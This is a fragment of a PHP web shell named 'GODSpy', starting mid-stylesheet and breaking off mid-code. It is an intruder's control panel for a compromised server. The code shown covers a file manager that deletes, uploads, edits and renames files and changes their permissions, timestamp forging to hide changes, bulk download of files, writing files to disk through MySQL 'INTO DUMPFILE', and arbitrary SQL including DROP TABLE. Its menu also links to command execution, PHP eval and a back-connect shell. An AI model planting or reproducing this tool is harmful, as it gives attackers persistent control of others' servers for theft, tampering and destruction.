.bt {border-color:#b0b0b0;background:#3d3d3d;color:#fff;height:22px;}
a {color:#00f;text-decoration:underline;}
a:hover{color:#f00;text-decoration:none;}
.w{color:green;font-weight:bold;}
.r{color:red;}
.alt1 td, .alt2 td, .focus td, .head td {border-top:1px solid #fff;border-bottom:1px solid #ddd;padding:5px 10px 5px 5px;}
.alt1 td{background:#f1f1f1;}
.alt2 td{background:#f9f9f9;}
.focus td{background:#ffa;}
.head td{background:#e9e9e9;font-weight:bold;}
.head td span{font-weight:normal;}
form, h2{margin:0;padding:0;}
h2{height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration:none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.e,.m {padding:10px;text-align:center;font-weight:bold;}
.e {background:#FFC;border:1px solid #F30;}
.m {background:#CF9;border:1px solid #0C3;}
.nw{white-space:nowrap;}
</style>
<script type="text/javascript"><!--
function CheckAll(form) {
for(var i=0;i<form.elements.length;i++) {
	var e = form.elements[i];
	if(e.name != 'chkall')
	e.checked = form.chkall.checked;
	}
}
function $(id){return document.getElementById(id);}
function gohaz(act){
$('gohaz').haz.value=act;
$('gohaz').submit();
}
//--></script>
</head>
<body>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
	<td><span style="float:right;"><b>GODSpy Ver: <?php echo date('Y');?></b></span>Your IP: <?php echo $_SERVER['REMOTE_ADDR'] . ' | Server Data: ' .$_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>

</tr>
<tr class="alt1">
	<td><span style="float:right;">Safe Mode: <?php echo getcfg('safe_mode');?></span>
	<a href="javascript:gohaz('log');">Logout</a> | <a href="javascript:gohaz('file');">File Manager</a> | 
	<a href="javascript:gohaz('sqladmin');">MySQL Manager</a> |	<a href="javascript:gohaz('sqlf');">MySQL Upload &amp; Download</a> | 
	<a href="javascript:gohaz('sh');">Execute Command</a> | <a href="javascript:gohaz('env');">PHP Variable</a> | 
	<a href="javascript:gohaz('evl');">Eval PHP Code</a><?php if(!IS_WIN) {?> | <a href="javascript:gohaz('bconx');">Back Connect</a><?php }?>

	</td>
</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php
formhead(array('name'=>'gohaz'));
makehide('haz');
p('</form>');
$errmsg && m($errmsg,'e');
!$dir && $dir = '.';
$nowpath = getPath(F_ROOT, $dir);
if(substr($dir, -1) != '/') {
	$dir = $dir.'/';
}
$uedir = ue($dir);
if(!$haz || $haz == 'file') {
	$dir_writeable = @is_writable($nowpath) ? '<span class="w">Writable</span>' : '<span class="r">Non-writable</span>';
	if($doing == 'deldir' && $thefile) {
		if(!file_exists($thefile)) m("$thefile directory does not exist",'e');
		elseif(deltree($thefile)) m('Directory '.basename($thefile).' delete success');
		else m('Directory '.basename($thefile).' delete failed','e');
	}elseif($doing == 'delf' && $thefile) {
		if(!file_exists($thefile)) m("$thefile does not exist",'e');
		elseif(@unlink($thefile)) m("The File <em>$thefile</em> has been deleted");
		else m("File <em>$thefile</em> delete failed",'e');
	}
	elseif($newdirname) {
		$mkdirs = $nowpath.$newdirname;
		if(file_exists($mkdirs)) m("Directory $newdirname has already exists",'e');
		elseif(@mkdir($mkdirs,0777)) {@chmod($mkdirs,0777);m("Directory $newdirname created success");}
		else m("Directory $newdirname creation failed",'e');
	}
	elseif($doupfile) {
		if(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name'])) m('File upload success');
		else m('File upload failed','e');
	}
	elseif($editfilename && $filecontent) {
		if(sv_file($editfilename, $filecontent)) m("Save file success");
		else m('Save file failed','e');		
	}
	elseif($pfile && $newperm) {
		if(!file_exists($pfile)) m('The original file does not exist','e');
		else {
			$newperm = base_convert($newperm,8,10);
			if(@chmod($pfile,$newperm)) m('Modify file attributes success');
			else m('Modify file attributes failed','e');
		}
	}
	elseif($oldname && $newfilename) {
		$nname = $nowpath.$newfilename;
		if(file_exists($nname) || !file_exists($oldname)) m($nname.' has already existed or original file does not exist','e');
		else m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : '<i class="r">failed</i>'));
	}
	elseif($sname && $tofile) {
		if(file_exists($tofile) || !file_exists($sname)) m('The goal file has already existed or original file does not exist','e');
		elseif(@copy($sname,$tofile)) m(basename($tofile).' copied '.basename($tofile).' success');
		else m(basename($tofile).' copied failed','e');
	}
	elseif($curfile && $tarfile) {
		$time = @filemtime($tarfile);
		if(!@file_exists($curfile) || !@file_exists($tarfile)) m('The goal file has already existed or original file does not exist','e');
		elseif(@touch($curfile,$time,$time)) m('Modify file the last modified success');
		else m('Modify file the last modified failed','e');
	}
	elseif($curfile && $year && $month && $day && $hour && $minute && $second) {
		$time = strtotime("$year-$month-$day $hour:$minute:$second");
		if(!@file_exists($curfile)) m(basename($curfile).' does not exist','e');
		elseif(@touch($curfile,$time,$time)) m('Modify file the last modified success');
		else m('Modify file the last modified failed');
	}
	elseif($doing == 'downrar') {
		if($dl) {
			$dfiles='';
			foreach ($dl as $filepath => $value) {
				$dfiles.=$filepath.',';
			}
			$dfiles=substr($dfiles,0,strlen($dfiles)-1);
			$dl=explode(',',$dfiles);
			$zip=new PHPZip($dl);
			$code=$zip->out;
			header('Content-type: application/octet-stream');
			header('Accept-Ranges: bytes');
			header('Accept-Length: '.strlen($code));
			header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');
			echo $code;
			exit;
		} else {
			m('Please select file(s)','e');
		}
	}
	elseif($doing=='delfiles') {
		if($dl) {
			$dfiles='';
			$succ = $fail = 0;
			foreach ($dl as $filepath => $value) {
				if(@unlink($filepath)) {
					$succ++;
				} else {
					$fail++;
				}
			}
			m('Deleting '.count($dl).' files: <span class="w">success '.$succ.'</span> - <span class="r">fail '.$fail.'</span>','e');
		} else {
			m('Please select a file(s)','e');
		}
	}
	formhead(array('name'=>'createdir'));
	makehide('newdirname');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'fileperm'));
	makehide('newperm');
	makehide('pfile');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'copyfile'));
	makehide('sname');
	makehide('tofile');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'rename'));
	makehide('oldname');
	makehide('newfilename');
	makehide('dir',$nowpath);
	p('</form>');
	formhead(array('name'=>'fileopform'));
	makehide('haz');
	makehide('opfile');
	makehide('dir');
	p('</form>');
	$free = @disk_free_space($nowpath);
	!$free && $free = 0;
	$all = @disk_total_space($nowpath);
	!$all && $all = 0;
	$used = $all-$free;
	$used_percent = @round(100/($all/$free),2);
	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');
?>

<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td class="nw">Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
	<td width="100%"><input name="view_writable" value="0" type="hidden" />
	<input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:100%;margin:0 8px;" /></td>
    <td class="nw"><input class="bt" value="GO" type="submit" /></td>
  </tr>

  </form>
</table>
<script type="text/javascript">
okdir = 'Are you sure to delete this directory?\n\nIf non-empty directory, will be delete all the files.';
okfil = 'Are you sure to delete this file?';
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if(!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if(!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if(!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if(!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m) {
	if(m && !confirm(m)) {return;}
	$('filelist').doing.value=doing;
	if(thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if(!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(haz,opfile,dir){
	$('fileopform').haz.value=haz;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if(view_writable) {
		$('godir').view_writable.value=1;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
</script>
<?php
	tbhead();
	p('<form action="'.$self.'" method="post" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
	p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div>');
	p('<a href="javascript:godir(\''.S_ROOT.'\');">WebRoot</a>');
	if($view_writable) {
		p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
	} else {
		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">View Writable</a>');
	}
	p(' | <a href="javascript:createdir();">Make Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Make File</a>');
	if(IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if($obj && is_object($obj)) {
			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
			foreach($obj->Drives as $drive) {
				if($drive->DriveType == 2) {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				} else {
					p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
				}
			}
		}
	}
	p('</td></tr></form>');
	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / User</td><td width="22%">Action</td></tr>');
	$dirdata=array();
	$filedata=array();
	if($view_writable) {
		$dirdata = GetList($nowpath);
	} else {
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) {
			$filepath=$nowpath.$file;
			if(@is_dir($filepath)){
				$dirdb['filename']=$file;
				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$dirdb['dirchmod']=getChmod($filepath);
				$dirdb['dirperm']=getPerms($filepath);
				$dirdb['fileowner']=getUser($filepath);
				$dirdb['dirlink']=$nowpath;
				$dirdb['server_link']=$filepath;
				$dirdb['client_link']=ue($filepath);
				$dirdata[]=$dirdb;
			} else {		
				$filedb['filename']=$file;
				$filedb['size']=sizecount(@filesize($filepath));
				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$filedb['filechmod']=getChmod($filepath);
				$filedb['fileperm']=getPerms($filepath);
				$filedb['fileowner']=getUser($filepath);
				$filedb['dirlink']=$nowpath;
				$filedb['server_link']=$filepath;
				$filedb['client_link']=ue($filepath);
				$filedata[]=$filedb;
			}
		}
		unset($dirdb);
		unset($filedb);
		@closedir($dirs);
	}
	@sort($dirdata);
	@sort($filedata);
	$dir_i = '0';
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			$tbg = bg();
			p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
			p('<td width="2%" class="nw">&nbsp;</td>');
			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
			p('<td class="nw">'.$dirdb['mtime'].'</td>');
			p('<td class="nw">--</td>');
			p('<td class="nw">');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].' / '.$dirdb['dirperm'].'</a>');
			p($dirdb['fileowner'].'</td>');
			p('<td class="nw"><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',okdir)">Del</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('<tr class="'.bg().'">');
				p('<td align="center"><font face="Wingdings 3" size=4>UP</font></td><td class="nw" colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
				p('</tr>');
			}
		}
	}
	p('<tr><td style="background:#555;height:3px;" colspan="6">&nbsp;</td></tr>');
	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
	makehide('haz','file');
	makehide('thefile');
	makehide('doing');
	makehide('dir',$nowpath);
	$file_i = '0';
	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			$fileurl = str_replace(S_ROOT,'',$filedb['server_link']);
			$thisbg = bg();
			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
			p('<td width="2%" class="nw"><input type="checkbox" value="1" name="dl['.$filedb['server_link'].']" /></td>');
			p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');
			p('<td class="nw">'.$filedb['mtime'].'</td>');
			p('<td class="nw">'.$filedb['size'].'</td>');
			p('<td class="nw">');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].' / '.$filedb['fileperm'].'</a>');
			p($filedb['fileowner'].'</td>');
			p('<td class="nw">');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
			p('<a href="javascript:dofile(\'delf\',\''.$filedb['server_link'].'\', okfil)" title="Delete">Del</a> | <a href="javascript:rename(\''.$filedb['server_link'].'\');" title="Rename">Ren</a> | ');
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Time</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Packing download selected</a> - <a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}
elseif($haz == 'sqlf') {
	if($doing=="mysqlupload"){
		$file = $_FILES['uploadfile'];
		$filename = $file['tmp_name'];
		if(file_exists($savepath)) {
			m('The goal file has already existed');
		} else {
			if(!$filename) {
				m('Please choose a file');
			} else {
				$fp=@fopen($filename,'r');
				$contents=@fread($fp, filesize($filename));
				@fclose($fp);
				$contents = bin2hex($contents);
				if(!$upname) $upname = $file['name'];
				dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
			}
		}
	}
?>

<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$charsets = array(''=>'Default','utf8'=>'UTF-8', 'latin1'=>'Latin1');
	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
	makehide('haz','sqlf');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBName:');
	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
	p("</p>\n</form>");
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" id="mysqlfile">');
	p('<h2>Upload file</h2>');
	p('<p><b>This operation the DB user must has FILE privilege</b></p>');
	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
	p('<h2>Download file</h2>');
	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
	makehide('dbname');
	makehide('charset');
	makehide('doing');
	makehide('haz','sqlf');
	p('</form>');
}
elseif($haz=='sqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
	if(isset($dbhost)){
		$dbform .= '<input type="hidden" id="dbhost" name="dbhost" value="'.$dbhost.'" />'."\n";
	}
	if(isset($dbuser)) {
		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
	}
	if(isset($dbpass)) {
		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
	}
	if(isset($dbport)) {
		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
	}
	if(isset($dbname)) {
		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
	}
	if(isset($charset)) {
		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
	}
	if($doing == 'backupmysql' && $saveasfile) {
		if(!$table) {
			m('Please choose the table','e');
		} else {
			$lnk=dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			$table = array_flip($table);
			$fp = @fopen($path,'w');
			if($fp) {
				$result = q('SHOW tables');
				if(!$result) p('<h2>'.mysql_error().'</h2>');
				$mysqldata = '';
				while($currow = mysql_fetch_array($result)) {
					if(isset($table[$currow[0]])) {
						sqldumptable($currow[0], $fp);
					}
				}
				fclose($fp);
				$fileurl = str_replace(F_ROOT,'',$path);
				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close($lnk);
			} else {
				m('Backup failed','e');
			}
		}
	}
	if($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			if($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if($keystr && $valstr) {
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
		}
	}
	if($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if($valstr) {
			$where = base64_decode($base64);
			dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
		}
	}
	if($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
	}
	if($tablename && $doing == 'drop') {
		dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if(q("DROP TABLE $tablename")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	}
	$charsets = array(''=>'Default','utf8'=>'UTF-8', 'latin1'=>'Latin1');
	formhead(array('title'=>'MYSQL Manager'));
	makehide('haz','sqladmin');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
	p("</p>\n</form>");
?>

<script type="text/javascript">
function editrecord(haz, base64, tablename){
	if(haz == 'del') {		
		if(!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=haz;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if(doing) {
		$('settable').doing.value=doing;
	}
	if(page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
</script>
<?php 
formhead(array('name'=>'recordlist'));
makehide('doing');
makehide('haz','sqladmin');
makehide('base64');
makehide('tablename');
p($dbform);
p('</form>');
formhead(array('name'=>'setdbname'));
makehide('haz','sqladmin');
p($dbform);
if(!$dbname) {
	makehide('dbname');
}
p('</form>');
formhead(array('name'=>'settable'));
makehide('haz','sqladmin');
p($dbform);
makehide('tablename');
makehide('page',$page);
makehide('doing');
p('</form>');
$cachetables = array();	
$pagenum = 30;
$page = intval($page);
if($page) {
	$start_limit = ($page - 1) * $pagenum;
	} else {
	$start_limit = 0;
	$page = 1;
}
if(isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
	$lnk=dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
	$mysqlver = mysql_get_server_info();
	p('<form id="setdbname" method="post" action="'.$self.'">
	<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
	$highver = $mysqlver > '4.1' ? 1 : 0;
	$query = q("SHOW DATABASES");
	$dbs = array();
	$dbs[] = '-- Select a database --';
	while($db = mysql_fetch_array($query)) {
		$dbs[$db['Database']] = $db['Database'];
	}
	makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
	p('</form>');
	$tabledb = array();
	if($dbname) {
		p('<p>');
		p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
		if($tablename) {
			p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');}
			p('</p>');
			mysql_select_db($dbname);
			$getnumsql = '';
			$runquery = 0;
			if($sql_query) {
				$runquery = 1;
			}
			$allowedit = 0;
			if($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename";
				$getnumsql = $sql_query;
				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
				$allowedit = 1;
			}
			p('<form action="" method="post">');
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
			makehide('tablename', $tablename);
			makehide('haz','sqladmin');
			p($dbform);
			p('</form>');
			if($tablename || ($runquery && $sql_query)) {
				if($doing == 'structure') {
					$result = q("SHOW COLUMNS FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('<table border="0" cellpadding="3" cellspacing="0">');
					p('<tr class="head">');
					p('<td>Field</td>');
					p('<td>Type</td>');
					p('<td>Null</td>');
					p('<td>Key</td>');
					p('<td>Default</td>');
					p('<td>Extra</td>');
					p('</tr>');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
						p('<td>'.$row['Field'].'</td>');
						p('<td>'.$row['Type'].'</td>');
						p('<td>'.$row['Null'].'&nbsp;</td>');
						p('<td>'.$row['Key'].'&nbsp;</td>');
						p('<td>'.$row['Default'].'&nbsp;</td>');
						p('<td>'.$row['Extra'].'&nbsp;</td>');
						p('</tr>');
					}
					tbfoot();
				} elseif($doing == 'insert' || $doing == 'edit') {
					$result = q('SHOW COLUMNS FROM '.$tablename);
					while ($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					$rs = array();
					if($doing == 'insert') {
						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
					} else {
						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
						$where = base64_decode($base64);
						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
						$rs = mysql_fetch_array($result);
					}
					p('<form method="post" action="'.$self.'">');
					p($dbform);
					makehide('haz','sqladmin');
					makehide('tablename',$tablename);
					p('<table border="0" cellpadding="3" cellspacing="0">');
					foreach ($rowdb as $row) {
						if($rs[$row['Field']]) {
							$value = htmlspecialchars($rs[$row['Field']],ENT_QUOTES);
						} else {
							$value = '';
						}
						$tbg = bg();
						p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
						p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
					}
					if($doing == 'insert') {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
					} else {
						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
						makehide('base64', $base64);
					}
					p('</table></form>');
				} else {
					$querys = @explode(';',$sql_query);
					foreach($querys as $num=>$query) {
						if($query) {
							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
							switch(qy($query)) {
								case 0:
								p('<h2>Error : '.mysql_error().'</h2>');
								break;	
								case 1:
								if(strtolower(substr($query,0,13)) == 'select * from') {
									$allowedit = 1;
								}
								if($getnumsql) {
									$tatol = mysql_num_rows(q($getnumsql));
									$multipage = multi($tatol, $pagenum, $page, $tablename);
								}
								if(!$tablename) {
									$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
									$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
									preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
									$tablename = $matches[1][0];
								}
								$result = q($query);
								p($multipage);
								p('<table border="0" cellpadding="3" cellspacing="0">');
								p('<tr class="head">');
								if($allowedit) p('<td>Action</td>');
								$fieldnum = @mysql_num_fields($result);
								for($i=0;$i<$fieldnum;$i++){
									$name = @mysql_field_name($result, $i);
									$type = @mysql_field_type($result, $i);
									$len = @mysql_field_len($result, $i);
									p("<td class=\"nw\">$name<br /><span>$type($len)</span></td>");
								}
								p('</tr>');
								while($mn = @mysql_fetch_assoc($result)){
									$tbg = bg();
									p('<tr class="'.$tbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$tbg.'\';">');
									$where = $tmp = $b1 = '';
									foreach($mn as $key=>$inside){
										if($inside) {
										$where .= $tmp.$key."='".addslashes($inside)."'";
										$tmp = ' AND ';
										}
										$b1 .= '<td class="nw">'.html_clean($inside).'&nbsp;</td>';
									}
									$where = base64_encode($where);
								if($allowedit) p('<td class="nw"><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
								p($b1);
								p('</tr>');
								unset($b1);
								}
								tbfoot();
								p($multipage);
								break;	
								case 2:
								$ar = mysql_affected_rows();
								p('<h2>affected rows : <b>'.$ar.'</b></h2>');
								break;
							}
						}
